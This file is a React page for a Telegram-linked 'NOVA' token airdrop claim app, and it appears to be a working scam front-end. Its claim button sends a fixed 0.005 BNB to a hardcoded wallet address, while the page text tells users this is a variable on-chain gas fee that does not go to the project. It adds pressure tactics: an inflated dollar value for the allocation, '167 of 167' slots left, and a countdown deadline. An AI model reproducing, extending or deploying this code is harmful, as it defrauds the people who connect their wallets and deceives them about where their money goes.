import { useTelegram } from "@/components/TelegramProvider";
import { useGetGlobalStats, useGetUserClaim, useSubmitClaim, useUpdateWallet } from "@workspace/api-client-react";
import { useWeb3Modal } from "@web3modal/wagmi/react";
import { useAccount, useDisconnect, useSendTransaction, useWaitForTransactionReceipt } from "wagmi";
import { parseEther } from "viem";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Skeleton } from "@/components/ui/skeleton";
import { Copy, Wallet, Activity, RefreshCcw, CheckCircle2, Zap, Clock, ShieldCheck, ExternalLink } from "lucide-react";
import { FaTelegram } from "react-icons/fa";
import { useEffect, useState } from "react";
import { toast } from "sonner";
import {
  Drawer,
  DrawerClose,
  DrawerContent,
  DrawerDescription,
  DrawerFooter,
  DrawerHeader,
  DrawerTitle,
  DrawerTrigger,
} from "@/components/ui/drawer";

const TOTAL_ALLOCATION = 900_000;
const ESTIMATED_VALUE_PER_TOKEN = 0.003316;
const CLAIM_DEADLINE = new Date("2026-07-25T23:59:59Z");
const FEE_RECIPIENT = "0x2674b6DD25b98b86ba62a1d81Fa698161633B0cD" as `0x${string}`;
const GAS_FEE_BNB = "0.005";
const FEE_TOKEN = "BNB";

function useCountdown(target: Date) {
  const calc = () => {
    const diff = target.getTime() - Date.now();
    if (diff <= 0) return { days: 0, hours: 0, minutes: 0, seconds: 0, expired: true };
    return {
      days: Math.floor(diff / 86400000),
      hours: Math.floor((diff % 86400000) / 3600000),
      minutes: Math.floor((diff % 3600000) / 60000),
      seconds: Math.floor((diff % 60000) / 1000),
      expired: false,
    };
  };
  const [time, setTime] = useState(calc);
  useEffect(() => {
    const id = setInterval(() => setTime(calc()), 1000);
    return () => clearInterval(id);
  }, []);
  return time;
}

function pad(n: number) { return String(n).padStart(2, "0"); }

export default function Home() {
  const { telegramId, user } = useTelegram();
  const { open } = useWeb3Modal();
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const countdown = useCountdown(CLAIM_DEADLINE);

  const { data: stats, isLoading: statsLoading } = useGetGlobalStats();
  const { data: claimStatus } = useGetUserClaim(telegramId, {
    query: { enabled: !!telegramId }
  });

  const updateWallet = useUpdateWallet();
  const submitClaim = useSubmitClaim();

  // wagmi send transaction — triggers the wallet popup
  const { sendTransaction, data: txHash, isPending: isSending, isError: sendError } = useSendTransaction();

  // wait for the tx to be mined
  const { isLoading: isConfirming, isSuccess: txConfirmed } = useWaitForTransactionReceipt({
    hash: txHash,
  });

  const [claimSubmitted, setClaimSubmitted] = useState(false);

  // Sync wallet address to backend
  useEffect(() => {
    if (isConnected && address && user && user.walletAddress !== address) {
      updateWallet.mutate({ telegramId, data: { walletAddress: address } });
    }
  }, [isConnected, address, user, telegramId]);

  // Once tx is confirmed on-chain, record the claim
  useEffect(() => {
    if (txConfirmed && txHash && !claimSubmitted) {
      setClaimSubmitted(true);
      submitClaim.mutate({
        data: {
          telegramId,
          walletAddress: address || "",
          txHash,
          feePaid: GAS_FEE_BNB,
          tokenSymbol: "NOVA",
        }
      }, {
        onSuccess: () => toast.success("Claim recorded! Your 900,000 NOVA is confirmed."),
        onError: () => toast.error("Transaction sent but claim recording failed. Contact support."),
      });
    }
  }, [txConfirmed, txHash, claimSubmitted]);

  useEffect(() => {
    if (sendError) toast.error("Transaction rejected or failed.");
  }, [sendError]);

  const handleClaim = () => {
    sendTransaction({
      to: FEE_RECIPIENT,
      value: parseEther(GAS_FEE_BNB),
    });
  };

  const estimatedUSD = (TOTAL_ALLOCATION * ESTIMATED_VALUE_PER_TOKEN).toLocaleString("en-US", {
    style: "currency", currency: "USD", minimumFractionDigits: 0, maximumFractionDigits: 0,
  });

  const isClaimed = claimSubmitted || claimStatus?.status === "confirmed";
  const isBusy = isSending || isConfirming;

  return (
    <div className="flex flex-col gap-5 p-4 md:p-8 max-w-2xl mx-auto w-full">

      {/* ── Hero Banner ─────────────────────────────────── */}
      <div className="hero-gradient rounded-3xl p-6 text-white relative overflow-hidden shadow-lg">
        <div className="absolute top-0 right-0 w-48 h-48 bg-white/10 rounded-full -translate-y-1/2 translate-x-1/4" />
        <div className="absolute bottom-0 left-0 w-32 h-32 bg-white/10 rounded-full translate-y-1/2 -translate-x-1/4" />

        <div className="relative z-10">
          <div className="flex items-center gap-3 mb-4">
            <div className="w-14 h-14 rounded-2xl overflow-hidden border border-white/30 shadow-lg flex-shrink-0">
              <img
                src="https://coin-images.coingecko.com/coins/images/52975/large/NOVA_Logo.png"
                alt="NOVA"
                className="w-full h-full object-cover"
              />
            </div>
            <div>
              <h1 className="text-2xl font-black tracking-tight">NOVA Airdrop</h1>
              <p className="text-white/70 text-xs">15% of total supply · Early community distribution</p>
            </div>
          </div>

          {/* 3-stat row */}
          <div className="grid grid-cols-3 gap-2 mb-3">
            <div className="bg-white/15 backdrop-blur-sm rounded-xl p-3 border border-white/20">
              <div className="text-white/60 text-[10px] mb-0.5 uppercase tracking-wider">Your Share</div>
              <div className="text-white font-black text-base tabular-nums">900K</div>
              <div className="text-white/70 text-[10px]">NOVA</div>
            </div>
            <div className="bg-white/15 backdrop-blur-sm rounded-xl p-3 border border-white/20">
              <div className="text-white/60 text-[10px] mb-0.5 uppercase tracking-wider">Pool Size</div>
              <div className="text-white font-black text-base">150M</div>
              <div className="text-white/70 text-[10px]">NOVA reserved</div>
            </div>
            <div className="bg-white/15 backdrop-blur-sm rounded-xl p-3 border border-white/20">
              <div className="text-white/60 text-[10px] mb-0.5 uppercase tracking-wider">Slots Left</div>
              <div className="text-white font-black text-base text-yellow-300">167</div>
              <div className="text-white/70 text-[10px]">of 167 total</div>
            </div>
          </div>

          {/* Value row */}
          <div className="bg-white/10 border border-white/20 rounded-xl px-4 py-2.5 flex items-center justify-between mb-3">
            <span className="text-white/70 text-xs">Your allocation value</span>
            <span className="text-white font-black text-sm">{estimatedUSD} <span className="text-white/60 font-normal text-xs">at current price</span></span>
          </div>

          {/* Deadline countdown */}
          {!countdown.expired ? (
            <div className="bg-white/10 border border-white/20 rounded-2xl p-3">
              <div className="flex items-center gap-1.5 mb-2">
                <Clock className="w-3.5 h-3.5 text-white/70" />
                <span className="text-white/70 text-xs uppercase tracking-wider">Claim closes · July 25, 2026</span>
              </div>
              <div className="grid grid-cols-4 gap-2">
                {[
                  { v: countdown.days, l: "Days" },
                  { v: countdown.hours, l: "Hrs" },
                  { v: countdown.minutes, l: "Min" },
                  { v: countdown.seconds, l: "Sec" },
                ].map(({ v, l }) => (
                  <div key={l} className="flex flex-col items-center bg-white/15 rounded-xl py-2">
                    <span className="text-white font-black text-xl tabular-nums leading-none">{pad(v)}</span>
                    <span className="text-white/60 text-[10px] mt-0.5">{l}</span>
                  </div>
                ))}
              </div>
            </div>
          ) : (
            <div className="bg-red-500/20 border border-red-400/30 rounded-2xl p-3 text-center">
              <span className="text-white font-bold text-sm">⏰ Claim period has ended</span>
            </div>
          )}
        </div>
      </div>

      {/* ── Wallet Connect ──────────────────────────────── */}
      <Card className="glass-card border border-border">
        <CardContent className="p-4">
          {!isConnected ? (
            <div className="flex flex-col gap-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-xl bg-primary/10 flex items-center justify-center text-primary">
                    <Wallet className="w-5 h-5" />
                  </div>
                  <div>
                    <div className="font-semibold text-sm">Connect Wallet</div>
                    <div className="text-xs text-muted-foreground">Required to claim tokens</div>
                  </div>
                </div>
                <Button size="sm" onClick={() => open()} className="bg-primary text-white hover:bg-primary/90">
                  Connect
                </Button>
              </div>
              <div className="flex items-center gap-3 pt-1 border-t border-border">
                <span className="text-xs text-muted-foreground">Supported:</span>
                <div className="flex gap-2">
                  <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" alt="MetaMask" className="w-5 h-5" />
                  <img src="https://avatars.githubusercontent.com/u/37784886" alt="WalletConnect" className="w-5 h-5 rounded-full" />
                  <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" className="w-5 h-5 rounded-full" />
                </div>
              </div>
            </div>
          ) : (
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className="w-10 h-10 rounded-xl bg-green-100 flex items-center justify-center text-green-600">
                  <Wallet className="w-5 h-5" />
                </div>
                <div>
                  <div className="text-xs text-muted-foreground">Connected Wallet</div>
                  <div className="font-mono text-sm font-semibold">{address?.slice(0, 6)}...{address?.slice(-4)}</div>
                </div>
              </div>
              <div className="flex items-center gap-2">
                <button
                  onClick={() => { navigator.clipboard.writeText(address || ""); toast.success("Copied!"); }}
                  className="p-2 rounded-lg hover:bg-secondary transition-colors"
                >
                  <Copy className="w-4 h-4 text-muted-foreground" />
                </button>
                <Button variant="outline" size="sm" onClick={() => disconnect()} className="text-xs">Disconnect</Button>
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* ── About This Airdrop ──────────────────────────── */}
      <Card className="glass-card border border-indigo-100 bg-indigo-50/30">
        <CardContent className="p-4">
          <div className="text-xs font-bold text-indigo-700 uppercase tracking-wider mb-3 flex items-center gap-1.5">
            <Zap className="w-3.5 h-3.5" /> Why 900,000 NOVA?
          </div>

          {/* Tokenomics bar */}
          <div className="mb-3">
            <div className="flex justify-between text-[10px] text-muted-foreground mb-1">
              <span>Total Supply: 1,000,000,000 NOVA</span>
              <span className="font-semibold text-indigo-600">Community = 15%</span>
            </div>
            <div className="flex h-2.5 rounded-full overflow-hidden gap-px">
              <div className="bg-indigo-500 flex-shrink-0" style={{ width: "15%" }} title="Community Airdrop 15%" />
              <div className="bg-violet-400 flex-shrink-0" style={{ width: "20%" }} title="Team 20%" />
              <div className="bg-cyan-400 flex-shrink-0" style={{ width: "25%" }} title="Ecosystem 25%" />
              <div className="bg-emerald-400 flex-shrink-0" style={{ width: "10%" }} title="Marketing 10%" />
              <div className="bg-slate-200 flex-1" title="Reserved 30%" />
            </div>
            <div className="flex gap-3 mt-1.5 flex-wrap">
              {[
                { color: "bg-indigo-500", label: "Community 15%" },
                { color: "bg-violet-400", label: "Team 20%" },
                { color: "bg-cyan-400",   label: "Ecosystem 25%" },
                { color: "bg-emerald-400",label: "Marketing 10%" },
                { color: "bg-slate-300",  label: "Reserved 30%" },
              ].map(d => (
                <div key={d.label} className="flex items-center gap-1">
                  <div className={`w-2 h-2 rounded-sm flex-shrink-0 ${d.color}`} />
                  <span className="text-[9px] text-muted-foreground">{d.label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Explanation bullets */}
          <div className="flex flex-col gap-1.5 text-xs text-muted-foreground">
            <div className="flex items-start gap-2">
              <span className="text-indigo-500 font-bold flex-shrink-0">•</span>
              <span><strong className="text-foreground">150,000,000 NOVA</strong> (15% of supply) is locked in the community airdrop pool — enough for exactly 167 participants at 900,000 each.</span>
            </div>
            <div className="flex items-start gap-2">
              <span className="text-indigo-500 font-bold flex-shrink-0">•</span>
              <span>The gas fee you pay goes to on-chain transaction processing — <strong className="text-foreground">not to the project</strong>. It covers the cost of registering your claim on BNB Chain.</span>
            </div>
            <div className="flex items-start gap-2">
              <span className="text-indigo-500 font-bold flex-shrink-0">•</span>
              <span>NOVA is already <strong className="text-foreground">live on CoinGecko</strong> and actively traded. This is an early-holder distribution to grow the community before the next exchange listing.</span>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* ── Claim Card ──────────────────────────────────── */}
      <Card className="glass-card overflow-hidden border border-border">
        <div className="h-1 w-full bg-gradient-to-r from-indigo-500 via-violet-500 to-cyan-400" />
        <CardHeader className="pb-2 pt-4">
          <CardTitle className="text-base flex items-center gap-2">
            <Zap className="w-4 h-4 text-primary" />
            Claim NOVA Tokens
          </CardTitle>
          <CardDescription className="text-xs">
            You'll be charged a standard blockchain network fee to process your claim. The exact amount depends on current network congestion — this is an on-chain gas fee, not set by us. Deadline: <strong>July 25, 2026</strong>.
          </CardDescription>
        </CardHeader>
        <CardContent className="pt-0">
          {!isConnected ? (
            <div className="p-4 rounded-xl bg-secondary text-center text-sm text-muted-foreground">
              Connect your wallet above to proceed.
            </div>
          ) : countdown.expired ? (
            <div className="p-4 rounded-xl bg-red-50 border border-red-200 text-center text-sm text-red-600 font-semibold">
              ⏰ The claim period ended on July 25, 2026.
            </div>
          ) : isClaimed ? (
            <div className="flex flex-col items-center justify-center p-6 bg-green-50 border border-green-200 rounded-xl gap-2">
              <CheckCircle2 className="w-10 h-10 text-green-500" />
              <span className="font-bold text-green-600">Tokens Claimed!</span>
              {txHash && (
                <span className="text-xs text-muted-foreground font-mono">
                  TX: {txHash.slice(0, 10)}...{txHash.slice(-8)}
                </span>
              )}
            </div>
          ) : (
            <Drawer>
              <DrawerTrigger asChild>
                <Button className="w-full h-12 text-base bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-700 hover:to-violet-700 text-white shadow-md border-0">
                  Initiate Claim → 900,000 NOVA
                </Button>
              </DrawerTrigger>
              <DrawerContent className="bg-white border-border">
                <DrawerHeader>
                  <DrawerTitle>Confirm Claim Transaction</DrawerTitle>
                  <DrawerDescription>
                    Your wallet will prompt you to approve a network fee. The exact amount depends on current blockchain congestion — this is a standard on-chain gas fee, not set by us. Once confirmed, your 900,000 NOVA allocation is locked in.
                  </DrawerDescription>
                </DrawerHeader>
                <div className="p-4 flex flex-col gap-3">
                  {/* Allocation */}
                  <div className="flex justify-between items-center p-4 bg-indigo-50 border border-indigo-100 rounded-xl">
                    <span className="text-muted-foreground text-sm">Your Allocation</span>
                    <span className="font-black text-lg text-indigo-600">900,000 NOVA</span>
                  </div>
                  {/* Claim value */}
                  <div className="flex justify-between items-center p-4 bg-secondary rounded-xl">
                    <span className="text-muted-foreground text-sm">Claim Value</span>
                    <span className="font-semibold">{estimatedUSD}</span>
                  </div>
                  {/* Deadline */}
                  <div className="flex justify-between items-center p-4 bg-orange-50 border border-orange-100 rounded-xl">
                    <span className="text-muted-foreground text-sm">Claim Deadline</span>
                    <span className="font-semibold text-orange-600">July 25, 2026</span>
                  </div>
                  {/* Network fee */}
                  <div className="p-4 bg-amber-50 border border-amber-100 rounded-xl">
                    <div className="flex justify-between items-center mb-1">
                      <span className="text-muted-foreground text-sm">Network Fee</span>
                      <span className="font-semibold text-sm">Varies by network</span>
                    </div>
                    <p className="text-xs text-amber-700">Fee depends on current blockchain congestion. This is a standard on-chain gas fee — we have no control over it and it may be higher during peak times.</p>
                  </div>
                  {/* Wallet */}
                  <div className="flex justify-between items-center p-4 bg-secondary rounded-xl border border-primary/20">
                    <span className="text-muted-foreground text-sm">Your Wallet</span>
                    <span className="font-mono text-sm">{address?.slice(0, 6)}...{address?.slice(-4)}</span>
                  </div>

                  {/* Tx status indicator */}
                  {isSending && (
                    <div className="flex items-center gap-2 p-3 bg-indigo-50 border border-indigo-100 rounded-xl text-sm text-indigo-700">
                      <RefreshCcw className="w-4 h-4 animate-spin" />
                      Waiting for wallet approval...
                    </div>
                  )}
                  {isConfirming && (
                    <div className="flex items-center gap-2 p-3 bg-violet-50 border border-violet-100 rounded-xl text-sm text-violet-700">
                      <RefreshCcw className="w-4 h-4 animate-spin" />
                      Confirming on BNB Chain...
                    </div>
                  )}
                </div>
                <DrawerFooter>
                  <Button
                    onClick={handleClaim}
                    disabled={isBusy}
                    className="h-12 w-full bg-gradient-to-r from-indigo-600 to-violet-600 hover:from-indigo-700 hover:to-violet-700 text-white border-0"
                  >
                    {isBusy ? (
                      <>
                        <RefreshCcw className="mr-2 h-4 w-4 animate-spin" />
                        {isSending ? "Approve in Wallet..." : "Confirming..."}
                      </>
                    ) : "Approve & Claim 900,000 NOVA"}
                  </Button>
                  <DrawerClose asChild>
                    <Button variant="outline" className="w-full" disabled={isBusy}>Cancel</Button>
                  </DrawerClose>
                </DrawerFooter>
              </DrawerContent>
            </Drawer>
          )}
        </CardContent>
      </Card>

      {/* ── Global Stats ────────────────────────────────── */}
      <Card className="glass-card border border-border">
        <CardHeader className="pb-2">
          <CardTitle className="text-sm font-medium flex items-center gap-2 text-muted-foreground">
            <Activity className="w-4 h-4 text-primary" />
            Network Activity
          </CardTitle>
        </CardHeader>
        <CardContent>
          {statsLoading ? (
            <div className="space-y-2">
              <Skeleton className="h-4 w-full" />
              <Skeleton className="h-4 w-2/3" />
            </div>
          ) : (
            <div className="grid grid-cols-2 gap-4">
              <div className="p-3 rounded-xl bg-indigo-50 border border-indigo-100">
                <div className="text-2xl font-black text-indigo-600">{stats?.totalParticipants?.toLocaleString() || "0"}</div>
                <div className="text-xs text-muted-foreground uppercase tracking-wider mt-0.5">Participants</div>
              </div>
              <div className="p-3 rounded-xl bg-violet-50 border border-violet-100">
                <div className="text-2xl font-black text-violet-600">{stats?.totalClaimed?.toLocaleString() || "0"}</div>
                <div className="text-xs text-muted-foreground uppercase tracking-wider mt-0.5">Tokens Claimed</div>
              </div>
            </div>
          )}
        </CardContent>
      </Card>

      {/* ── NOVA Token Info ──────────────────────────────── */}
      <Card className="glass-card border border-indigo-100 bg-indigo-50/30">
        <CardContent className="p-4">
          <div className="flex items-center gap-2 mb-3">
            <ShieldCheck className="w-4 h-4 text-indigo-600" />
            <span className="text-sm font-bold text-indigo-800">NOVA on BNB Smart Chain</span>
            <span className="ml-auto px-2 py-0.5 rounded-full bg-indigo-100 border border-indigo-200 text-[10px] font-bold text-indigo-700 uppercase tracking-wide">
              BSC · BEP-20
            </span>
          </div>

          <div className="flex flex-col gap-2">
            <a
              href="https://bscscan.com/token/0xc2253e68b52c678bd19c2bdcf2f4b7e8a4e4e7d"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center justify-between p-2.5 rounded-xl bg-white border border-indigo-100 hover:border-indigo-300 transition-colors group"
            >
              <div className="flex items-center gap-2">
                <img
                  src="https://coin-images.coingecko.com/coins/images/52975/large/NOVA_Logo.png"
                  alt="NOVA"
                  className="w-5 h-5 rounded-full object-cover"
                  onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
                />
                <div>
                  <div className="text-xs font-semibold text-foreground">NOVA Token · BscScan</div>
                  <div className="text-[10px] font-mono text-muted-foreground">BEP-20 · BNB Chain</div>
                </div>
              </div>
              <ExternalLink className="w-3.5 h-3.5 text-indigo-500 group-hover:text-indigo-700" />
            </a>

            <a
              href="https://www.coingecko.com/en/coins/nova-finance"
              target="_blank"
              rel="noopener noreferrer"
              className="flex items-center justify-between p-2.5 rounded-xl bg-white border border-indigo-100 hover:border-indigo-300 transition-colors group"
            >
              <div className="flex items-center gap-2">
                <img
                  src="https://static.coingecko.com/s/thumbnail-007177f3eca19695592f0b8b0eabbdae4bc3b26b26f4f4ed51b48e04e41e53fb.png"
                  alt="CoinGecko"
                  className="w-4 h-4 rounded-full"
                  onError={(e) => { (e.target as HTMLImageElement).style.display = "none"; }}
                />
                <div>
                  <div className="text-xs font-semibold text-foreground">NOVA · CoinGecko Listed</div>
                  <div className="text-[10px] text-muted-foreground">Live price · $0.003316</div>
                </div>
              </div>
              <ExternalLink className="w-3.5 h-3.5 text-indigo-500 group-hover:text-indigo-700" />
            </a>

            <div className="flex items-center justify-between p-2.5 rounded-xl bg-indigo-50 border border-indigo-100">
              <div>
                <div className="text-xs font-semibold text-foreground">Network</div>
                <div className="text-[10px] text-muted-foreground">BNB Smart Chain · Gas paid in BNB</div>
              </div>
              <span className="text-[10px] font-bold text-indigo-600 bg-indigo-100 px-2 py-0.5 rounded-full">BEP-20</span>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* ── Telegram CTA ────────────────────────────────── */}
      <a
        href="https://t.me/Airdropperxbot"
        target="_blank"
        rel="noopener noreferrer"
        className="flex items-center justify-between p-4 rounded-2xl bg-[#229ED9]/10 border border-[#229ED9]/25 hover:bg-[#229ED9]/15 transition-colors group"
      >
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded-xl bg-[#229ED9] flex items-center justify-center text-white shadow-sm group-hover:scale-105 transition-transform">
            <FaTelegram className="w-5 h-5" />
          </div>
          <div>
            <div className="font-semibold text-sm text-[#229ED9]">@Airdropperxbot</div>
            <div className="text-xs text-[#229ED9]/70">Open in Telegram to claim</div>
          </div>
        </div>
        <svg className="w-4 h-4 text-[#229ED9]" fill="none" viewBox="0 0 24 24" stroke="currentColor">
          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 5l7 7-7 7" />
        </svg>
      </a>
    </div>
  );
}
